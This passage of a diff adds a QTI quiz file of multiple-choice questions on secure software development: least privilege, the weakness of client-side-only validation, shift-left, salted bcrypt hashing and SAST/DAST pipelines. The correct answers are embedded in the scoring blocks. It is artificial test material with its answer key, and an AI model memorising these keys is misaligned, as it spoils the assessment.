+                  <mattext texttype="text/plain">Fail secure</mattext>
+                </material>
+              </response_label>
+              <response_label ident="g35eafd381bf05d8f71f1c419b528e35_q16_c">
+                <material>
+                  <mattext texttype="text/plain">Least privilege</mattext>
+                </material>
+              </response_label>
+              <response_label ident="g35eafd381bf05d8f71f1c419b528e35_q16_d">
+                <material>
+                  <mattext texttype="text/plain">Separation of duties</mattext>
+                </material>
+              </response_label>
+            </render_choice>
+          </response_lid>
+        </presentation>
+        <resprocessing>
+          <outcomes>
+            <decvar maxvalue="100" minvalue="0" varname="SCORE" vartype="Decimal"/>
+          </outcomes>
+          <respcondition continue="No">
+            <conditionvar>
+              <varequal respident="response1">g35eafd381bf05d8f71f1c419b528e35_q16_c</varequal>
+            </conditionvar>
+            <setvar action="Set" varname="SCORE">100</setvar>
+          </respcondition>
+        </resprocessing>
+      </item>
+      <item ident="g35eafd381bf05d8f71f1c419b528e35_q17" title="Question">
+        <itemmetadata>
+          <qtimetadata>
+            <qtimetadatafield>
+              <fieldlabel>cc_profile</fieldlabel>
+              <fieldentry>cc.multiple_choice.v0p1</fieldentry>
+            </qtimetadatafield>
+          </qtimetadata>
+        </itemmetadata>
+        <presentation>
+          <material>
+            <mattext texttype="text/html">&lt;div&gt;&lt;p&gt;A developer validates user input on the front end using JavaScript before the form is submitted. The developer argues this is sufficient input validation. Why is this argument incorrect?&lt;/p&gt;&lt;/div&gt;</mattext>
+          </material>
+          <response_lid ident="response1" rcardinality="Single">
+            <render_choice>
+              <response_label ident="g35eafd381bf05d8f71f1c419b528e35_q17_a">
+                <material>
+                  <mattext texttype="text/plain">JavaScript validation is slower than server-side validation</mattext>
+                </material>
+              </response_label>
+              <response_label ident="g35eafd381bf05d8f71f1c419b528e35_q17_b">
+                <material>
+                  <mattext texttype="text/plain">An attacker can bypass client-side JavaScript validation by directly crafting and sending HTTP requests</mattext>
+                </material>
+              </response_label>
+              <response_label ident="g35eafd381bf05d8f71f1c419b528e35_q17_c">
+                <material>
+                  <mattext texttype="text/plain">JavaScript cannot validate email address formats</mattext>
+                </material>
+              </response_label>
+              <response_label ident="g35eafd381bf05d8f71f1c419b528e35_q17_d">
+                <material>
+                  <mattext texttype="text/plain">Front-end validation is only valid for GET requests, not POST requests</mattext>
+                </material>
+              </response_label>
+            </render_choice>
+          </response_lid>
+        </presentation>
+        <resprocessing>
+          <outcomes>
+            <decvar maxvalue="100" minvalue="0" varname="SCORE" vartype="Decimal"/>
+          </outcomes>
+          <respcondition continue="No">
+            <conditionvar>
+              <varequal respident="response1">g35eafd381bf05d8f71f1c419b528e35_q17_b</varequal>
+            </conditionvar>
+            <setvar action="Set" varname="SCORE">100</setvar>
+          </respcondition>
+        </resprocessing>
+      </item>
+      <item ident="g35eafd381bf05d8f71f1c419b528e35_q18" title="Question">
+        <itemmetadata>
+          <qtimetadata>
+            <qtimetadatafield>
+              <fieldlabel>cc_profile</fieldlabel>
+              <fieldentry>cc.multiple_choice.v0p1</fieldentry>
+            </qtimetadatafield>
+          </qtimetadata>
+        </itemmetadata>
+        <presentation>
+          <material>
+            <mattext texttype="text/html">&lt;div&gt;&lt;p&gt;A security team applies the principle of "shift left" to their development process. What does this mean in practice?&lt;/p&gt;&lt;/div&gt;</mattext>
+          </material>
+          <response_lid ident="response1" rcardinality="Single">
+            <render_choice>
+              <response_label ident="g35eafd381bf05d8f71f1c419b528e35_q18_a">
+                <material>
+                  <mattext texttype="text/plain">Security teams should shift their focus to left-to-right reading of code</mattext>
+                </material>
+              </response_label>
+              <response_label ident="g35eafd381bf05d8f71f1c419b528e35_q18_b">
+                <material>
+                  <mattext texttype="text/plain">Security testing and validation activities are moved earlier in the development lifecycle</mattext>
+                </material>
+              </response_label>
+              <response_label ident="g35eafd381bf05d8f71f1c419b528e35_q18_c">
+                <material>
+                  <mattext texttype="text/plain">Security personnel should physically move to sit with the development team</mattext>
+                </material>
+              </response_label>
+              <response_label ident="g35eafd381bf05d8f71f1c419b528e35_q18_d">
+                <material>
+                  <mattext texttype="text/plain">Security controls should be applied at the network perimeter rather than the application layer</mattext>
+                </material>
+              </response_label>
+            </render_choice>
+          </response_lid>
+        </presentation>
+        <resprocessing>
+          <outcomes>
+            <decvar maxvalue="100" minvalue="0" varname="SCORE" vartype="Decimal"/>
+          </outcomes>
+          <respcondition continue="No">
+            <conditionvar>
+              <varequal respident="response1">g35eafd381bf05d8f71f1c419b528e35_q18_b</varequal>
+            </conditionvar>
+            <setvar action="Set" varname="SCORE">100</setvar>
+          </respcondition>
+        </resprocessing>
+      </item>
+      <item ident="g35eafd381bf05d8f71f1c419b528e35_q19" title="Question">
+        <itemmetadata>
+          <qtimetadata>
+            <qtimetadatafield>
+              <fieldlabel>cc_profile</fieldlabel>
+              <fieldentry>cc.multiple_response.v0p1</fieldentry>
+            </qtimetadatafield>
+          </qtimetadata>
+        </itemmetadata>
+        <presentation>
+          <material>
+            <mattext texttype="text/html">&lt;div&gt;&lt;p&gt;An application uses the following password storage approach: &lt;code&gt;hash = MD5(password)&lt;/code&gt;. A breach exposes the hashed passwords. An attacker uses a rainbow table and cracks 90% of passwords within 24 hours. What TWO improvements would prevent this attack? (Select TWO)&lt;/p&gt;&lt;/div&gt;</mattext>
+          </material>
+          <response_lid ident="response1" rcardinality="Multiple">
+            <render_choice>
+              <response_label ident="g35eafd381bf05d8f71f1c419b528e35_q19_a">
+                <material>
+                  <mattext texttype="text/plain">Use bcrypt instead of MD5</mattext>
+                </material>
+              </response_label>
+              <response_label ident="g35eafd381bf05d8f71f1c419b528e35_q19_b">
+                <material>
+                  <mattext texttype="text/plain">Add a unique per-user salt before hashing</mattext>
+                </material>
+              </response_label>
+              <response_label ident="g35eafd381bf05d8f71f1c419b528e35_q19_c">
+                <material>
+                  <mattext texttype="text/plain">Store the hash in a separate database table</mattext>
+                </material>
+              </response_label>
+              <response_label ident="g35eafd381bf05d8f71f1c419b528e35_q19_d">
+                <material>
+                  <mattext texttype="text/plain">Encrypt the MD5 hash with AES-256</mattext>
+                </material>
+              </response_label>
+              <response_label ident="g35eafd381bf05d8f71f1c419b528e35_q19_e">
+                <material>
+                  <mattext texttype="text/plain">Require users to reset passwords every 30 days</mattext>
+                </material>
+              </response_label>
+            </render_choice>
+          </response_lid>
+        </presentation>
+        <resprocessing>
+          <outcomes>
+            <decvar maxvalue="100" minvalue="0" varname="SCORE" vartype="Decimal"/>
+          </outcomes>
+          <respcondition continue="No">
+            <conditionvar>
+              <and>
+              <varequal respident="response1">g35eafd381bf05d8f71f1c419b528e35_q19_a</varequal>
+              <varequal respident="response1">g35eafd381bf05d8f71f1c419b528e35_q19_b</varequal>
+              <not><varequal respident="response1">g35eafd381bf05d8f71f1c419b528e35_q19_c</varequal></not>
+              <not><varequal respident="response1">g35eafd381bf05d8f71f1c419b528e35_q19_d</varequal></not>
+              <not><varequal respident="response1">g35eafd381bf05d8f71f1c419b528e35_q19_e</varequal></not>
+            </and>
+            </conditionvar>
+            <setvar action="Set" varname="SCORE">100</setvar>
+          </respcondition>
+        </resprocessing>
+      </item>
+      <item ident="g35eafd381bf05d8f71f1c419b528e35_q20" title="Question">
+        <itemmetadata>
+          <qtimetadata>
+            <qtimetadatafield>
+              <fieldlabel>cc_profile</fieldlabel>
+              <fieldentry>cc.multiple_choice.v0p1</fieldentry>
+            </qtimetadatafield>
+          </qtimetadata>
+        </itemmetadata>
+        <presentation>
+          <material>
+            <mattext texttype="text/html">&lt;div&gt;&lt;p&gt;A development team uses an automated pipeline where SAST runs at code commit, SCA runs at build time, and DAST runs against the staging environment. A critical SQL injection vulnerability is discovered by DAST in staging. What does this finding indicate about the SAST configuration?&lt;/p&gt;&lt;/div&gt;</mattext>
+          </material>
+          <response_lid ident="response1" rcardinality="Single">
+            <render_choice>
+              <response_label ident="g35eafd381bf05d8f71f1c419b528e35_q20_a">
+                <material>
+                  <mattext texttype="text/plain">SAST is not needed if DAST catches the same vulnerability</mattext>
+                </material>
+              </response_label>
+              <response_label ident="g35eafd381bf05d8f71f1c419b528e35_q20_b">
+                <material>
+                  <mattext texttype="text/plain">SAST may be misconfigured, missing the SQL injection rule, or the finding is a false negative</mattext>
+                </material>
+              </response_label>
+              <response_label ident="g35eafd381bf05d8f71f1c419b528e35_q20_c">
+                <material>
+                  <mattext texttype="text/plain">SAST tools cannot detect SQL injection vulnerabilities</mattext>
+                </material>
+              </response_label>
+              <response_label ident="g35eafd381bf05d8f71f1c419b528e35_q20_d">
+                <material>
+                  <mattext texttype="text/plain">The vulnerability was introduced after the SAST scan completed</mattext>
+                </material>
+              </response_label>
+            </render_choice>
+          </response_lid>
+        </presentation>
+        <resprocessing>
+          <outcomes>
+            <decvar maxvalue="100" minvalue="0" varname="SCORE" vartype="Decimal"/>
+          </outcomes>
+          <respcondition continue="No">
+            <conditionvar>
+              <varequal respident="response1">g35eafd381bf05d8f71f1c419b528e35_q20_b</varequal>
+            </conditionvar>
+            <setvar action="Set" varname="SCORE">100</setvar>
+          </respcondition>
+        </resprocessing>
+      </item>
+    </section>
+  </assessment>
+</questestinterop>
